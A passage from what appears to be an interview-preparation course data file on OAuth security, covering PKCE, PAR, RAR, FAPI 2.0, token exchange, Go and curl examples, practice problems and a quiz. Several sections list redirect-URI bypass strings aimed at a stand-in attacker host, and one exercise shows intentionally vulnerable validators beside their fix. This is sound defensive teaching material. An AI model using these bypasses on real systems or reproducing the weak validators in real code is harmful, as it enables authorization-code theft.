//                     &client_assertion=<JWS signed with the client's private key>
{
  "iss": "orders-service",                       // client_id
  "sub": "orders-service",                       // client_id
  "aud": "https://auth.example.com/oauth/token", // the AS token endpoint (or issuer)
  "jti": "5f1c2a6e-1d1b-4a8e-9a1e-7c0c3b9b2f10", // single use, AS keeps a replay cache
  "iat": 1793275200,
  "exp": 1793275260                              // ~60 seconds
}`
            }
          ]
        },
        {
          title: 'Scopes, Consent and Redirect URI Validation',
          def: `<p><strong>Scopes</strong> express what a client may do on the user's behalf (<code>orders:read</code>, <code>calendar.events.readonly</code>). They are <em>coarse delegation limits</em>, not a complete authorization model: the API must still check that the user may access <em>this</em> object. Design rules:</p>
<ul>
<li>Least privilege and incremental authorization: ask for <code>photos:read</code> now, <code>photos:write</code> when the feature is used.</li>
<li>Separate read/write and sensitive scopes; never one <code>api</code> or <code>admin</code> super-scope for third parties.</li>
<li>For fine-grained grants ("pay 50 EUR to account X") use <strong>Rich Authorization Requests</strong> (RFC 9396, <code>authorization_details</code>).</li>
<li>Consent screens must show the verified client name, publisher and scopes in plain language; admins can restrict which apps users may consent to — <em>illicit consent grant</em> phishing tricks users into authorizing malicious apps with mailbox access.</li>
</ul>
<p><strong>Redirect URI validation</strong> is critical because the code (or token) is delivered there:</p>
<ul>
<li>Register full redirect URIs; compare with <strong>exact string matching</strong> (OAuth 2.1). No wildcards, no prefix or substring matching, no partial path matching.</li>
<li>Attacks on loose matching: <code>https://app.example.com.evil.net/cb</code>, <code>https://app.example.com@evil.net/</code>, <code>https://app.example.com/cb/../open-redirect?to=evil</code>, or chaining with an open redirect on the allowed host to leak the code via Referer.</li>
<li>Exception: native-app loopback redirects may vary the port (<code>http://127.0.0.1:{any}/cb</code>).</li>
<li>Also validate post-login and post-logout redirect targets in your own app (open redirect).</li>
</ul>`,
          interview: 'Explain that scopes limit what the client can do but do not replace object-level authorization; show two or three redirect-URI bypass strings and state that exact matching is the rule. Mention consent phishing as a real-world attack against enterprise tenants.',
          examples: [
            {
              label: 'Exact redirect URI matching in Go',
              lang: 'go',
              code: `type Client struct {
    ID           string
    RedirectURIs map[string]struct{} // registered full URIs
    Native       bool
}

func (c *Client) RedirectAllowed(raw string) bool {
    if _, ok := c.RedirectURIs[raw]; ok {
        return true // exact string match, no normalization games
    }
    if c.Native { // RFC 8252: loopback redirect, any port, same path
        u, err := url.Parse(raw)
        if err != nil || u.Scheme != "http" || u.Hostname() != "127.0.0.1" {
            return false
        }
        u.Host = "127.0.0.1"
        _, ok := c.RedirectURIs[u.String()]
        return ok
    }
    return false
}`
            }
          ]
        },
        {
          title: 'Common OAuth Vulnerabilities and Mitigations',
          def: `<table>
<thead><tr><th>Vulnerability</th><th>Mechanism</th><th>Mitigation</th></tr></thead>
<tbody>
<tr><td>CSRF on the callback / login CSRF</td><td>attacker feeds the victim a callback with the attacker's code</td><td><code>state</code> bound to the session; PKCE</td></tr>
<tr><td>Authorization code interception / injection</td><td>malicious app or leak obtains the code and redeems it</td><td>PKCE (S256), one-time short-lived codes</td></tr>
<tr><td>Redirect URI manipulation &amp; open redirect</td><td>code sent to an attacker-controlled URL</td><td>exact match; no open redirects on the client</td></tr>
<tr><td>Token leakage</td><td>tokens in URLs, logs, Referer, browser storage</td><td>no implicit; code flow; <code>Referrer-Policy</code>; BFF</td></tr>
<tr><td>Mix-up attack</td><td>client using several ASes is tricked into sending a code to the wrong AS</td><td><code>iss</code> in the authorization response (RFC 9207); per-AS redirect URIs</td></tr>
<tr><td>Access token replay at another API</td><td>RS accepts tokens issued for a different audience</td><td>audience restriction; sender-constrained tokens (DPoP, mTLS)</td></tr>
<tr><td>Request tampering</td><td>parameters modified in the front channel</td><td>PAR (RFC 9126) and signed requests (JAR, RFC 9101)</td></tr>
<tr><td>Client impersonation</td><td>leaked client secret (e.g. from a mobile binary)</td><td>public clients have no secret; <code>private_key_jwt</code>/mTLS for confidential ones</td></tr>
<tr><td>Consent phishing</td><td>malicious app requests broad scopes</td><td>publisher verification, admin consent policies, scope review</td></tr>
<tr><td>"Login with OAuth" (pseudo-authentication)</td><td>client trusts any access token as proof of login; token from another app is accepted</td><td>use OIDC ID tokens with <code>aud</code> = your client_id</td></tr>
</tbody>
</table>
<p>High-security profiles such as <strong>FAPI 2.0</strong> (open banking) bundle these: PAR, PKCE, sender-constrained tokens (DPoP or mTLS), <code>private_key_jwt</code>, short-lived codes and strict <code>iss</code> checks. RFC 9700 (OAuth 2.0 Security BCP, January 2025) is the authoritative checklist.</p>`,
          interview: 'Be able to explain at least five attacks with mechanism and mitigation, especially state/CSRF, code interception (PKCE), redirect URI manipulation, mix-up (iss), and the "OAuth as login" confused-deputy problem. Name RFC 9700 and FAPI 2.0.',
          examples: [
            {
              label: 'Pushed Authorization Request (RFC 9126)',
              lang: 'http',
              code: `POST /oauth/par HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

response_type=code&client_id=web-bff&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback
&scope=openid%20payments&state=xyz&code_challenge=E9Mel...&code_challenge_method=S256
&client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJ...

HTTP/1.1 201 Created
Content-Type: application/json

{"request_uri":"urn:ietf:params:oauth:request_uri:6esc_11ACC5bwc014ltc14eY22c","expires_in":60}

# Browser is then sent to a short, tamper-proof URL:
# GET /oauth/authorize?client_id=web-bff&request_uri=urn:ietf:params:oauth:request_uri:6esc_11ACC5bwc014ltc14eY22c`
            }
          ]
        },
        {
          title: 'PAR, RAR, Resource Indicators and FAPI 2.0: Hardening the Authorization Request',
          def: `<p>In the classic flow every authorization parameter travels through the browser URL: it can be <strong>tampered with</strong> (scope, redirect_uri, claims), <strong>leaks</strong> into history, logs and Referer (including PII such as <code>login_hint</code>), hits URL length limits, and the AS learns who the client is only when the user is already on its page. A family of RFCs fixes this:</p>
<table>
<thead><tr><th>Spec</th><th>What it does</th><th>Why it matters</th></tr></thead>
<tbody>
<tr><td><strong>PAR</strong> (RFC 9126)</td><td>client POSTs all authorization parameters to the AS over the back channel, <em>with client authentication</em>, and gets a short-lived, one-time <code>request_uri</code>; the browser carries only <code>client_id</code> + <code>request_uri</code></td><td>integrity and confidentiality of the request, early rejection of bad redirect URIs or scopes before any user interaction, no size limits; an AS can require it (<code>require_pushed_authorization_requests</code>)</td></tr>
<tr><td><strong>JAR</strong> (RFC 9101)</td><td>request parameters as a signed (optionally encrypted) JWT request object</td><td>signed, attributable requests; largely superseded by PAR except where non-repudiation is required</td></tr>
<tr><td><strong>RAR</strong> (RFC 9396)</td><td><code>authorization_details</code>: a JSON array of typed, fine-grained permissions (amount, currency, creditor account, document id)</td><td>per-transaction consent that scopes cannot express ("pay 45.00 EUR to IBAN X once"); the details are shown on the consent screen and returned in the token response / introspection so the RS can enforce them</td></tr>
<tr><td><strong>Resource Indicators</strong> (RFC 8707)</td><td><code>resource=https://orders.api</code> on authorize/token requests</td><td>audience-restricted tokens per API, so a token for API A is rejected by API B; with refresh tokens the client can get one narrow token per resource</td></tr>
<tr><td><strong>Step-up challenge</strong> (RFC 9470)</td><td>RS answers <code>401</code> with <code>WWW-Authenticate: Bearer error="insufficient_user_authentication", acr_values="..."</code></td><td>standard way for an API to demand stronger or fresher authentication for a sensitive call</td></tr>
</tbody>
</table>
<p><strong>FAPI 2.0 Security Profile</strong> (OpenID Foundation, final 2025; open banking, healthcare, government) bundles the hardening into one checklist: PAR required, authorization code + PKCE S256 only, confidential clients authenticated with <code>private_key_jwt</code> or mTLS, <strong>sender-constrained access tokens</strong> (DPoP or mTLS), <code>iss</code> in the authorization response (RFC 9207), exact redirect URIs, short-lived codes (about 60 s) and no implicit/hybrid flows. FAPI 2.0 Message Signing adds signed requests and responses where non-repudiation is needed. Even if you are not in finance, it is a good "what does a hardened OAuth deployment look like" answer.</p>`,
          interview: 'Be able to say what each piece fixes: PAR moves the authorization request to an authenticated back channel (tamper-proof, confidential, rejected early), RAR expresses transaction-level consent that scopes cannot, RFC 8707 resource indicators produce audience-restricted tokens, and RFC 9470 lets an API demand step-up. Summarize FAPI 2.0 as PAR + PKCE + strong client auth + sender-constrained tokens + iss checks.',
          examples: [
            { label: 'PAR request carrying RAR authorization_details for one payment', lang: 'http', code: `POST /oauth/par HTTP/1.1
Host: auth.bank.example
Content-Type: application/x-www-form-urlencoded
DPoP: eyJ0eXAiOiJkcG9wK2p3dCIs...            (binds the coming tokens to the client key)

response_type=code&client_id=fintech-app&redirect_uri=https%3A%2F%2Ffintech.example%2Fcb
&state=k3b...&code_challenge=E9Mel...&code_challenge_method=S256&scope=openid
&client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJ...
&authorization_details=[{"type":"payment_initiation","instructedAmount":{"currency":"EUR","amount":"45.00"},
  "creditorName":"Merchant A","creditorAccount":{"iban":"DE02100100109307118603"}}]   (URL-encoded in practice)

HTTP/1.1 201 Created
{"request_uri":"urn:ietf:params:oauth:request_uri:bwc4JK-ESC0w8acc191e-Y1LTC2","expires_in":60}

# Browser: GET /authorize?client_id=fintech-app&request_uri=urn:ietf:params:oauth:request_uri:bwc4JK-ESC0w8acc191e-Y1LTC2
# Consent screen shows "Pay 45.00 EUR to Merchant A"; the token response echoes authorization_details,
# and the payments API executes exactly that payment, once.` }
          ]
        }
      ],
      problems: [
        {
          t: 'Pick the right OAuth grant for six scenarios',
          d: 'easy',
          type: 'concept',
          hint: `<ul><li>Is there a user? Does the client have a browser? Can it keep a secret?</li><li>Is the call on behalf of a user to a downstream service?</li><li>Implicit and password grants are never the answer in 2026.</li></ul>`,
          solution: `1. Server-rendered web app (Go)                     -> Authorization code + PKCE, confidential client (private_key_jwt)
2. React SPA                                          -> BFF doing code + PKCE (or SPA as public client with code + PKCE + DPoP/rotation)
3. iOS/Android app                                    -> Code + PKCE via system browser, claimed HTTPS redirect, public client
4. Nightly batch job calling a reporting API          -> Client credentials (or cloud workload identity federation)
5. Smart TV / CLI tool                                -> Device authorization grant (RFC 8628)
6. Orders service calling payments on behalf of user  -> Token exchange (RFC 8693) for a payments-audience token
Never: implicit (tokens in URL) or ROPC (app collects passwords, no MFA/SSO).`,
          lang: 'text'
        },
        {
          t: 'Generate a PKCE verifier and S256 challenge in Go',
          d: 'easy',
          type: 'coding',
          hint: `<ul><li>Verifier: 32 random bytes, base64url without padding (43 chars).</li><li>Challenge: base64url(SHA-256(ASCII(verifier))).</li><li>Check against the RFC 7636 test vector.</li><li><code>golang.org/x/oauth2</code> provides <code>GenerateVerifier()</code> and <code>S256ChallengeFromVerifier()</code>.</li></ul>`,
          solution: `func NewPKCE() (verifier, challenge string) {
    b := make([]byte, 32)
    rand.Read(b) // crypto/rand
    verifier = base64.RawURLEncoding.EncodeToString(b)
    sum := sha256.Sum256([]byte(verifier))
    challenge = base64.RawURLEncoding.EncodeToString(sum[:])
    return
}

func TestRFC7636Vector(t *testing.T) {
    v := "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
    sum := sha256.Sum256([]byte(v))
    got := base64.RawURLEncoding.EncodeToString(sum[:])
    if got != "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" {
        t.Fatal(got)
    }
}

// Server side (AS): constant-time compare S256(verifier) with the stored challenge;
// reject code_challenge_method=plain; reject verifier length outside 43..128.`,
          lang: 'go'
        },
        {
          t: 'Implement an Authorization Code + PKCE client in Go',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li><code>oauth2.Config</code> with exact <code>RedirectURL</code>.</li><li>Login: random <code>state</code> + <code>oauth2.GenerateVerifier()</code>, stored server-side or in a short-lived <code>__Host-</code> cookie; <code>AuthCodeURL(state, oauth2.S256ChallengeOption(v))</code>.</li><li>Callback: handle <code>error</code>, compare state in constant time, <code>Exchange(ctx, code, oauth2.VerifierOption(v))</code>, delete login state.</li></ul>`,
          solution: `var conf = &oauth2.Config{
    ClientID:     "web-bff",
    ClientSecret: os.Getenv("OAUTH_CLIENT_SECRET"),
    Endpoint: oauth2.Endpoint{
        AuthURL:  "https://auth.example.com/oauth/authorize",
        TokenURL: "https://auth.example.com/oauth/token",
    },
    RedirectURL: "https://app.example.com/callback",
    Scopes:      []string{"orders:read"},
}

type loginState struct{ State, Verifier string }

func login(w http.ResponseWriter, r *http.Request) {
    ls := loginState{State: rand.Text(), Verifier: oauth2.GenerateVerifier()}
    if err := loginStore.Put(r.Context(), w, ls, 10*time.Minute); err != nil { // server-side, keyed by cookie
        http.Error(w, "internal error", http.StatusInternalServerError)
        return
    }
    http.Redirect(w, r, conf.AuthCodeURL(ls.State, oauth2.S256ChallengeOption(ls.Verifier)), http.StatusFound)
}

func callback(w http.ResponseWriter, r *http.Request) {
    q := r.URL.Query()
    ls, err := loginStore.Take(r.Context(), r) // fetch AND delete: single use
    if err != nil {
        http.Error(w, "login expired, try again", http.StatusBadRequest)
        return
    }
    if e := q.Get("error"); e != "" {
        http.Error(w, "authorization failed", http.StatusBadRequest) // log e + error_description server-side
        return
    }
    if subtle.ConstantTimeCompare([]byte(q.Get("state")), []byte(ls.State)) != 1 {
        http.Error(w, "invalid state", http.StatusBadRequest)
        return
    }
    if iss := q.Get("iss"); iss != "" && iss != "https://auth.example.com" { // RFC 9207 mix-up defense
        http.Error(w, "unexpected issuer", http.StatusBadRequest)
        return
    }
    tok, err := conf.Exchange(r.Context(), q.Get("code"), oauth2.VerifierOption(ls.Verifier))
    if err != nil {
        http.Error(w, "token exchange failed", http.StatusBadGateway)
        return
    }
    // Store tok server-side bound to a NEW session id; never send it to the browser.
    sessions.Create(r.Context(), w, tok)
    http.Redirect(w, r, "/", http.StatusSeeOther)
}`,
          lang: 'go'
        },
        {
          t: 'Walk through the Device Authorization grant with curl',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>Request device + user codes; display <code>verification_uri</code> and <code>user_code</code>.</li><li>Poll the token endpoint at <code>interval</code> seconds; add 5 s on <code>slow_down</code>.</li><li>Stop on <code>access_denied</code> or <code>expired_token</code>.</li></ul>`,
          solution: `AS=https://auth.example.com
resp=$(curl -s -X POST $AS/oauth/device_authorization -d client_id=acme-cli -d 'scope=openid offline_access deploy')
echo "$resp" | jq .
# {"device_code":"GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS","user_code":"WDJB-MJHT",
#  "verification_uri":"https://auth.example.com/device","expires_in":900,"interval":5}

DEVICE_CODE=$(echo "$resp" | jq -r .device_code)
INTERVAL=$(echo "$resp" | jq -r .interval)
echo "Open $(echo "$resp" | jq -r .verification_uri) and enter $(echo "$resp" | jq -r .user_code)"

while true; do
  sleep "$INTERVAL"
  tok=$(curl -s -X POST $AS/oauth/token \\
    -d grant_type=urn:ietf:params:oauth:grant-type:device_code \\
    -d device_code="$DEVICE_CODE" -d client_id=acme-cli)
  err=$(echo "$tok" | jq -r '.error // empty')
  case "$err" in
    authorization_pending) continue ;;
    slow_down) INTERVAL=$((INTERVAL + 5)) ;;
    "") echo "$tok" | jq '{token_type, expires_in, scope}'; break ;;
    *) echo "failed: $err"; exit 1 ;;   # access_denied | expired_token
  esac
done
# In Go: conf.DeviceAuth(ctx) then conf.DeviceAccessToken(ctx, resp) (golang.org/x/oauth2).`,
          lang: 'bash'
        },
        {
          t: 'Find the bypasses in a redirect_uri validator',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Try: different host with the allowed host as prefix, userinfo (<code>@</code>), path traversal, open redirect on the allowed host, scheme changes.</li><li>The fix is exact matching against registered URIs.</li></ul>`,
          solution: `// VULNERABLE validators seen in the wild
func v1(u string) bool { return strings.HasPrefix(u, "https://app.example.com") }
//  bypass: https://app.example.com.evil.net/cb         (host is app.example.com.evil.net)
//  bypass: https://app.example.com@evil.net/cb         (userinfo; host is evil.net)

func v2(u string) bool { return strings.Contains(u, "app.example.com/callback") }
//  bypass: https://evil.net/?x=app.example.com/callback

func v3(u string) bool {
    p, _ := url.Parse(u)
    return p.Host == "app.example.com" // any path allowed
}
//  bypass: https://app.example.com/logout?next=https://evil.net  (open redirect leaks code via Location/Referer)
//  bypass: https://app.example.com/user-uploads/attacker.html    (attacker page on same host reads code from URL)

// FIX: exact string match against the client's registered list (see Client.RedirectAllowed),
// plus remove open redirects on the client and send Referrer-Policy: no-referrer on the callback page.`,
          lang: 'go'
        },
        {
          t: 'Secure service-to-service calls with client credentials and private_key_jwt',
          d: 'medium',
          type: 'design',
          hint: `<ul><li>Each service is its own OAuth client with only the scopes/audiences it needs.</li><li>Prefer <code>private_key_jwt</code> or mTLS client auth; keys from a secret manager or workload identity.</li><li>Cache tokens until shortly before expiry; target APIs check <code>aud</code> and scope.</li><li>When the call is on behalf of a user, client credentials loses the user context — consider token exchange.</li></ul>`,
          solution: `Registration (per service, per environment):
  client_id: reporting-job   auth: private_key_jwt (ES256 key in Vault/KMS)   allowed scopes: reports:read   audience: https://reports.api
Flow:
  1. reporting-job builds a 60s client assertion JWT (iss=sub=client_id, aud=token endpoint, jti, exp) and signs it
  2. POST /oauth/token grant_type=client_credentials&scope=reports:read&client_assertion_type=...&client_assertion=...
  3. AS validates assertion (sig with registered JWKS, jti replay cache, exp) -> 5-10 min access token, aud=https://reports.api
  4. Client caches token (x/oauth2 TokenSource) and calls API; API validates iss/aud/scope/exp
Hardening:
  - No shared secrets in env vars; rotate keys via JWKS on the client registration
  - Network: mTLS (mesh) in addition, so a stolen token from outside the mesh is useless (or certificate-bound tokens)
  - Monitor token issuance per client; alert on unusual scopes or volume`,
          lang: 'text'
        },
        {
          t: 'Implement on-behalf-of calls with OAuth token exchange',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Problem: forwarding the user's token (aud=gateway, broad scopes) to every service is a confused-deputy and blast-radius risk.</li><li>RFC 8693: orders-service authenticates itself and exchanges the incoming user token for one with <code>aud=payments</code>, narrow scope, short TTL.</li><li>The new token carries the user as <code>sub</code> and the service as <code>act.sub</code>.</li></ul>`,
          solution: `POST /oauth/token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:token-exchange
&subject_token=eyJ...user-access-token...
&subject_token_type=urn:ietf:params:oauth:token-type:access_token
&audience=https://payments.internal
&scope=payments:charge
&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer
&client_assertion=eyJ...signed-by-orders-service...

HTTP/1.1 200 OK
{"access_token":"eyJ...","issued_token_type":"urn:ietf:params:oauth:token-type:access_token",
 "token_type":"Bearer","expires_in":120}

Issued token payload:
{"iss":"https://auth.example.com","sub":"u_8f3a2c","aud":"https://payments.internal",
 "scope":"payments:charge","act":{"sub":"orders-service"},"exp":...}

AS policy: orders-service may exchange tokens only for aud=payments.internal with scope payments:charge,
and only if the subject token has orders:write. Payments verifies aud, scope, and logs both sub and act.sub.`,
          lang: 'http'
        },
        {
          t: 'Review an OAuth integration for security vulnerabilities',
          d: 'hard',
          type: 'debug',
          hint: `<ul><li>Front channel: state, PKCE S256, exact redirect, iss check, no tokens in URL.</li><li>Back channel: client authentication, code single-use, token validation at the RS (aud!).</li><li>Storage: where are tokens kept, are refresh tokens rotated, are secrets in the mobile binary?</li><li>Logging: are codes/tokens written to logs or analytics?</li></ul>`,
          solution: `Checklist with findings from a typical review:
[ ] response_type=token used by SPA                      -> FINDING: implicit flow; migrate to code + PKCE via BFF
[ ] state generated but never compared                   -> FINDING: login CSRF; bind to session and verify
[ ] code_challenge_method=plain                          -> FINDING: use S256 only; AS should reject plain
[ ] redirect_uri registered as https://app.example.com/* -> FINDING: wildcard; register exact URIs
[ ] client_secret embedded in Android APK                -> FINDING: public client cannot hold secrets; remove, rotate
[ ] API accepts any token signed by the IdP              -> FINDING: no aud check; tokens for other apps work here
[ ] access token stored in localStorage                  -> FINDING: XSS exfiltration; BFF or in-memory + DPoP
[ ] refresh tokens never expire, not rotated             -> FINDING: enable rotation + reuse detection + absolute TTL
[ ] nginx access log records full callback URL           -> FINDING: codes in logs; strip query on /callback
[ ] multiple IdPs, no iss check in response              -> FINDING: mix-up risk; RFC 9207 iss validation
[ ] "login" decided by calling /me with an access token  -> FINDING: use OIDC ID token, validate aud = client_id`,
          lang: 'text'
        },
        {
          t: 'Design an OAuth authorization server setup for a multi-tenant API platform',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Clients: first-party web/mobile, third-party developer apps, partner backends.</li><li>Tenant model: issuer per tenant vs one issuer with a tenant claim.</li><li>Scope taxonomy, consent, developer registration (dynamic registration?), rate limits per client.</li><li>Token format and validation at the gateway; revocation; key management; audit.</li></ul>`,
          solution: `Decisions:
1. Product: managed IdP (Okta/Auth0/Entra External ID) or Keycloak/Ory Hydra - don't build crypto/flows yourself.
2. Issuer: single issuer https://auth.example.com with "tid" claim (simpler key mgmt), or per-tenant issuer
   https://auth.example.com/t/{tenant} when tenants bring their own IdP/branding. APIs pin allowed issuers.
3. Clients:
   - first-party web: BFF, code + PKCE, private_key_jwt
   - mobile: public, code + PKCE, DPoP-bound refresh tokens
   - third-party: registration portal with review, code + PKCE, consent screen, publisher verification
   - partner backends: client credentials with mTLS (certificate-bound tokens)
4. Scopes: resource:action (orders:read, orders:write, billing:read); sensitive scopes require admin consent;
   RAR for payment initiation.
5. Tokens: access JWT (RFC 9068, ES256, 10 min, aud per API), opaque rotated refresh tokens; introspection for partners.
6. Gateway: validates JWT (iss/aud/exp/sig), enforces scope per route, per-client rate limits; services do tenant +
   object-level checks.
7. Ops: key rotation every 90 days via JWKS, token revocation endpoint, audit log of grants/consents, anomaly
   detection on token issuance, consent revocation UI for tenant admins.`,
          lang: 'text'
        },
        {
          t: 'Design single-payment consent with PAR, RAR and DPoP (FAPI 2.0 style)',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Scopes like <code>payments:write</code> are too coarse: the user must approve <em>this</em> amount to <em>this</em> payee, once.</li><li>Push the request with PAR (client authenticated, tamper-proof); carry the payment in RAR <code>authorization_details</code>.</li><li>Bind tokens to the client key (DPoP or mTLS) and make the RS enforce the approved details and single use.</li></ul>`,
          solution: `Actors: fintech app (confidential client, private_key_jwt), bank AS, payments API (RS).

1. Client registration: private_key_jwt with a JWKS URL, redirect URIs exact, PAR required, DPoP required.
2. App creates a DPoP key pair and pushes the request:
   POST /par  (client_assertion, PKCE S256, state, DPoP proof, dpop_jkt,
               authorization_details=[{type: payment_initiation, amount 45.00 EUR, creditor IBAN, remittance info}])
   AS validates client auth, redirect_uri, schema of authorization_details -> request_uri (60 s, one-time).
3. Browser -> /authorize?client_id&request_uri. AS authenticates the user (passkey, SCA) and renders consent
   from the pushed details: "Pay 45.00 EUR to Merchant A from account ...1234". Nothing in the URL can change it.
4. Redirect with code + state + iss. App checks state and iss, redeems code with PKCE verifier,
   client assertion and a DPoP proof.
5. Token response: DPoP-bound access token (cnf.jkt), lifetime ~5 min, aud = payments API (resource indicator),
   authorization_details echoed with a consent id; no refresh token for a single payment.
6. Payments API: validates token + DPoP proof (htm/htu/ath/jti/jkt), then executes ONLY the payment described
   in authorization_details and marks the consent consumed (idempotency key = consent id) -> replay = 409.
7. Audit: consent record (who, what, when, client, key thumbprint) for disputes; notifications to the user.

Why each control:
  PAR -> amount/payee cannot be tampered in the browser and are not leaked in URLs
  RAR -> consent and enforcement are per transaction, not per broad scope
  PKCE + state + iss -> code interception, CSRF and mix-up
  DPoP / mTLS -> a stolen access token cannot be replayed by someone without the key
  private_key_jwt -> no shared secret to leak
This set is essentially the FAPI 2.0 Security Profile.`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'Explain the OAuth 2.0 Authorization Code flow with PKCE.',
          a: `<ol>
<li>The client creates a random <strong>code_verifier</strong>, derives <strong>code_challenge = BASE64URL(SHA256(verifier))</strong>, plus a random <strong>state</strong> (and <code>nonce</code> for OIDC), and stores them in the user's session.</li>
<li>It redirects the browser to the AS <code>/authorize</code> with <code>response_type=code</code>, <code>client_id</code>, exact <code>redirect_uri</code>, <code>scope</code>, <code>state</code>, <code>code_challenge</code>, <code>code_challenge_method=S256</code> (ideally via PAR).</li>
<li>The AS authenticates the user (MFA/passkey/SSO), collects consent, stores the challenge with a one-time code, and redirects to the <code>redirect_uri</code> with <code>code</code>, <code>state</code> and <code>iss</code>.</li>
<li>The client verifies <code>state</code> and <code>iss</code>, then POSTs to <code>/token</code> (back channel, TLS) with the code, <code>redirect_uri</code>, <code>code_verifier</code> and its client authentication if confidential.</li>
<li>The AS checks the code (unused, unexpired, issued to this client and redirect URI) and that SHA256(verifier) equals the challenge, then issues the access token (and refresh / ID token).</li>
<li>The client calls the API with the access token; the API validates issuer, audience, expiry, signature and scopes.</li>
</ol>
<p><strong>Why PKCE</strong>: the code travels through the browser and can leak (malicious app with the same custom scheme, logs, Referer). Without the verifier — which never left the client — the code can't be redeemed. <strong>Why state</strong>: binds the response to the user's browser session (CSRF / login CSRF). OAuth 2.1 makes PKCE mandatory for all clients, including confidential ones, because it also stops code injection.</p>`
        },
        {
          q: 'What changes in OAuth 2.1, and why were the implicit and password grants removed?',
          a: `<p>OAuth 2.1 is a consolidation, not a new protocol: RFC 6749 + bearer token usage + PKCE + native apps + browser apps guidance + the Security BCP (RFC 9700).</p>
<ul>
<li><strong>PKCE required</strong> for every authorization code flow.</li>
<li><strong>Implicit removed</strong>: access tokens in the redirect URL fragment leak via history, Referer, extensions and injected scripts; there is no client authentication, no refresh token and no sender-constraining. Code + PKCE now works for SPAs (CORS on the token endpoint), so implicit adds only risk.</li>
<li><strong>ROPC removed</strong>: the client handles the user's raw password, which breaks MFA, passkeys, SSO and consent, teaches users to type passwords into apps, and gives clients full impersonation power.</li>
<li><strong>Exact redirect URI matching</strong> (no wildcards).</li>
<li><strong>No bearer tokens in query strings</strong>.</li>
<li><strong>Refresh tokens for public clients</strong> must be sender-constrained or rotated.</li>
</ul>
<p>In practice: every user-facing client uses code + PKCE, every machine client uses client credentials (or workload identity), and devices without browsers use the device grant.</p>`
        },
        {
          q: 'Why is "login with OAuth" without OpenID Connect dangerous?',
          a: `<p>An OAuth access token says "the bearer may call this API"; it does not tell the <em>client</em> who the user is or that the token was issued <em>for this client</em>.</p>
<p>Classic failure (pseudo-authentication): a client accepts an access token, calls <code>/me</code>, and logs the user in as whoever comes back. A malicious app that received a token from a victim (for its own client_id) can replay it to your app and log in as the victim — your app never checked the token's audience. Implicit flow made this trivial via token injection.</p>
<p>OIDC fixes it with the <strong>ID token</strong>: a signed JWT whose <code>aud</code> is <em>your</em> <code>client_id</code>, with <code>iss</code>, <code>sub</code>, <code>exp</code>, <code>nonce</code> (binding to your auth request), <code>auth_time</code> and <code>acr/amr</code>. The client validates it before creating a session. So: OAuth for API access, OIDC for login.</p>`
        },
        {
          q: 'How should microservices use OAuth for internal calls?',
          a: `<ul>
<li><strong>No user context</strong> (batch, background jobs): <strong>client credentials</strong> with <code>private_key_jwt</code> or mTLS client authentication, or cloud workload identity federation; tokens audience-restricted per target API and cached until near expiry.</li>
<li><strong>On behalf of a user</strong>: don't blindly forward the edge token to every service. Use <strong>token exchange</strong> (RFC 8693) to get a short-lived token with <code>aud</code> = next service, reduced scopes, and an <code>act</code> claim identifying the calling service. Alternatively the gateway mints an internal "phantom" JWT from an opaque external token.</li>
<li><strong>Transport</strong>: mTLS between workloads (SPIFFE identities) so tokens are not the only control; optionally certificate-bound tokens (RFC 8705).</li>
<li><strong>Validation</strong>: every service validates the token locally (JWKS cache) — iss, aud, exp, scope — then does object-level authorization.</li>
</ul>
<p>This gives least privilege per hop, preserves the end-user identity for auditing and authorization, and avoids the confused-deputy problem.</p>`
        },
        {
          q: 'How should a mobile app implement OAuth securely?',
          a: `<ul>
<li><strong>Public client</strong>: no client secret in the binary (it will be extracted).</li>
<li><strong>Authorization code + PKCE (S256)</strong> via the <strong>system browser</strong> (ASWebAuthenticationSession / Custom Tabs) per RFC 8252 — never an embedded webview, which lets the app see credentials and breaks SSO and passkeys.</li>
<li><strong>Redirect URI</strong>: claimed HTTPS links (Universal Links / App Links) so another app can't register the same custom scheme and intercept codes.</li>
<li><strong>Tokens</strong>: store refresh tokens in Keychain/Keystore (hardware-backed); access tokens in memory; refresh tokens rotated with reuse detection or DPoP-bound with a non-exportable key.</li>
<li><strong>Extras</strong>: app attestation (App Attest / Play Integrity) to make client impersonation harder; certificate pinning only with a rotation plan.</li>
</ul>`
        }
      ],
      quiz: [
        { q: 'Name the four OAuth 2.0 roles.', a: 'Resource owner, client, authorization server, resource server.' },
        { q: 'What does PKCE protect against?', a: 'Authorization code interception and injection: a stolen code cannot be redeemed without the code_verifier that only the original client holds.' },
        { q: 'Why should code_challenge_method be S256 and not plain?', a: 'With plain the challenge equals the verifier, so anyone who sees the authorization request learns the verifier; S256 sends only a hash.' },
        { q: 'Which grant suits a CLI tool on a headless server?', a: 'The Device Authorization Grant (RFC 8628).' },
        { q: 'Which grants does OAuth 2.1 remove?', a: 'The implicit grant and the resource owner password credentials (ROPC) grant.' },
        { q: 'What is the purpose of the state parameter?', a: 'To bind the authorization response to the user\'s session and prevent CSRF / login CSRF on the redirect callback.' },
        { q: 'What does RFC 9207 add to the authorization response, and why?', a: 'An iss (issuer) parameter so clients using multiple authorization servers can detect mix-up attacks.' },
        { q: 'What does RFC 8693 token exchange let a service do?', a: 'Exchange a subject token (e.g. a user access token) for a new token with different audience/scope, optionally recording the acting service in the act claim.' },
